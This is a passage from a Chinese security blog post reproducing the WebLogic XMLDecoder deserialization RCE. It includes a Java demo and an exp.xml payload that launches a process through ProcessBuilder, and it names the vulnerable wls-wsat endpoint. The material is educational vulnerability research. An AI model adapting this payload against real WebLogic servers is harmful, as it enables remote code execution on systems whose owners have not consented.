+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3>WebLogic 的 WLS Security 组件对外提供 WebService 服务，其中使用 XMLDecoder 来解析 XML 格式数据，其存在反序列化漏洞，从而导致 RCE。<br>看一个RCE的解析<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.beans.XMLDecoder;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">porc</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;exp.xml&quot;</span>);</span><br><span class="line">        <span class="type">XMLDecoder</span> <span class="variable">xmlDecoder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XMLDecoder</span>(<span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(file));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> xmlDecoder.readObject();</span><br><span class="line">        xmlDecoder.close();</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+exp.xml<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.4.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>Calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405210811.png" alt="image.png"></p>
+<p>Weblogic 本质上是 Web Service 服务，报文内容类型是 SOAP 型 WebService 报文,所以 <code>/wls-wsat/CoordinatorPortType</code> 接口可以接收 XML 数据的请求包<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405211037.png" alt="image.png"></p>
+<p>此外,我们查看server/lib/wls-wsat.war/WEB-INF/web.xml文件可以发现这些接口都可以对SOAP报文进行处理,都有漏洞<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405211302.png" alt="image.png"><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405211435.png" alt="image.png"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://drun1baby.top/2023/02/12/CVE-2021-2109-WebLogic-JNDI-%E6%B3%A8%E5%85%A5/">https://drun1baby.top/2023/02/12/CVE-2021-2109-WebLogic-JNDI-%E6%B3%A8%E5%85%A5/</a></li>
+<li><a target="_blank" rel="noopener" href="https://drun1baby.top/2023/02/09/CVE-2017-10271-WebLogic-XMLDecoder/">https://drun1baby.top/2023/02/09/CVE-2017-10271-WebLogic-XMLDecoder/</a></li>
+<li><a target="_blank" rel="noopener" href="https://drun1baby.top/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/">https://drun1baby.top/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/</a></li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Jmx0hxq</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/04/06/Weblogic%E5%AD%A6%E4%B9%A02/">http://example.com/2024/04/06/Weblogic%E5%AD%A6%E4%B9%A02/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">jmx0hxq's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a></div><div class="post_share"><div class="social-share" data-image="/assets/sbpk/3.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/04/06/%E7%AC%AC%E4%BA%8C%E5%B1%8AAliyunCTF%20chain17%E5%A4%8D%E7%8E%B0/" title="第二届AliyunCTF chain17复现"><img class="cover" src="/assets/sbpk/4.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">第二届AliyunCTF chain17复现</div></div></a></div><div class="next-post pull-right"><a href="/2024/04/05/weblogic%E5%AD%A6%E4%B9%A01/" title="Weblogic学习1&amp;&amp;CVE-2015-4852分析"><img class="cover" src="/assets/sbpk/2.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Weblogic学习1&amp;&amp;CVE-2015-4852分析</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/03/14/Java%E7%9A%84URLDNS%E9%93%BE/" title="JAVA反序列化基础和URLDNS链"><img class="cover" src="/assets/blr/11.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-14</div><div class="title">JAVA反序列化基础和URLDNS链</div></div></a></div><div><a href="/2024/03/14/CC1/" title="JAVA反序列化之CC1链分析"><img class="cover" src="/assets/blr/6.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-14</div><div class="title">JAVA反序列化之CC1链分析</div></div></a></div><div><a href="/2024/03/26/fastjson%E7%AF%871-%E5%9F%BA%E7%A1%80%E7%94%A8%E6%B3%95/" title="fastjson篇1-基础用法"><img class="cover" src="/assets/blr/10.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-26</div><div class="title">fastjson篇1-基础用法</div></div></a></div><div><a href="/2024/03/27/fastjson%E7%AF%872-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="fastjson篇2-漏洞复现和版本绕过"><img class="cover" src="/assets/blr/11.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-27</div><div class="title">fastjson篇2-漏洞复现和版本绕过</div></div></a></div><div><a href="/2024/04/01/JNDI%E9%AB%98%E7%89%88%E6%9C%ACjdk%E7%BB%95%E8%BF%871/" title="JNDI绕过高版本jdk限制1"><img class="cover" src="/assets/blr/12.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-01</div><div class="title">JNDI绕过高版本jdk限制1</div></div></a></div><div><a href="/2024/04/01/JNDI%E9%AB%98%E7%89%88%E6%9C%ACjdk%E7%BB%95%E8%BF%872-JDBC/" title="JNDI绕过高版本jdk限制2-JDBC"><img class="cover" src="/assets/blr/13.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-01</div><div class="title">JNDI绕过高版本jdk限制2-JDBC</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/jmx0hxq.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Jmx0hxq</div><div class="author-info__description">总有人间一两风,填我十万八千梦</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">44</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/jmx0hxq" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:3077959912@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Weblogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-amp-amp-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.</span> <span class="toc-text">Weblogic 弱口令&amp;&amp;文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Weblogic-%E6%9C%AA%E6%8E%88%E6%9D%83-amp-amp-%E5%90%8E%E5%8F%B0RCE"><span class="toc-number">2.</span> <span class="toc-text">Weblogic 未授权&amp;&amp;后台RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2020-14883"><span class="toc-number">2.1.</span> <span class="toc-text">CVE-2020-14883</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2020-14882"><span class="toc-number">2.2.</span> <span class="toc-text">CVE-2020-14882</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E5%BC%8F1"><span class="toc-number">2.2.1.</span> <span class="toc-text">方式1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E5%BC%8F2"><span class="toc-number">2.2.2.</span> <span class="toc-text">方式2</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Weblogic-SSRF"><span class="toc-number">3.</span> <span class="toc-text">Weblogic SSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Weblogic-XMLDecoder"><span class="toc-number">4.</span> <span class="toc-text">Weblogic XMLDecoder</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#xml%E5%9F%BA%E7%A1%80"><span class="toc-number">4.1.</span> <span class="toc-text">xml基础</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">4.2.</span> <span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">4.3.</span> <span class="toc-text">漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/10/01/2024%20SCTF%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95/" title="2024SCTF出题记录"><img src="/assets/images/1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2024SCTF出题记录"/></a><div class="content"><a class="title" href="/2024/10/01/2024%20SCTF%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95/" title="2024SCTF出题记录">2024SCTF出题记录</a><time datetime="2024-09-30T17:23:49.277Z" title="发表于 2024-10-01 01:23:49">2024-10-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/05/31/2024%E4%BA%AC%E9%BA%92CTF%20ezldap%E5%A4%8D%E7%8E%B0/" title="2024京麒CTF ezldap复现分析"><img src="/assets/sbpk/18.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2024京麒CTF ezldap复现分析"/></a><div class="content"><a class="title" href="/2024/05/31/2024%E4%BA%AC%E9%BA%92CTF%20ezldap%E5%A4%8D%E7%8E%B0/" title="2024京麒CTF ezldap复现分析">2024京麒CTF ezldap复现分析</a><time datetime="2024-05-31T09:25:28.479Z" title="发表于 2024-05-31 17:25:28">2024-05-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/05/24/2024ciscn%20ezjava%E5%A4%8D%E7%8E%B0/" title="2024 CISCN ezjava复现总结"><img src="/assets/sbpk/17.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2024 CISCN ezjava复现总结"/></a><div class="content"><a class="title" href="/2024/05/24/2024ciscn%20ezjava%E5%A4%8D%E7%8E%B0/" title="2024 CISCN ezjava复现总结">2024 CISCN ezjava复现总结</a><time datetime="2024-05-23T16:17:21.306Z" title="发表于 2024-05-24 00:17:21">2024-05-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/05/17/jdk7u21/" title="Jdk7u21链子分析"><img src="/assets/sbpk/16.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Jdk7u21链子分析"/></a><div class="content"><a class="title" href="/2024/05/17/jdk7u21/" title="Jdk7u21链子分析">Jdk7u21链子分析</a><time datetime="2024-05-17T12:22:44.621Z" title="发表于 2024-05-17 20:22:44">2024-05-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/05/10/Jackson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" title="Jackson漏洞总结"><img src="/assets/sbpk/15.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Jackson漏洞总结"/></a><div class="content"><a class="title" href="/2024/05/10/Jackson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" title="Jackson漏洞总结">Jackson漏洞总结</a><time datetime="2024-05-10T07:47:01.326Z" title="发表于 2024-05-10 15:47:01">2024-05-10</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Jmx0hxq</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><div class="aplayer" data-id="1419123454" data-server="tencent" data-type="playlist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="none" data-autoplay="false" muted></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/metingjs/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener
+  btf.removeGlobalFnEvent('pjax')
+  btf.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.12.0"></script></div></div></body></html>
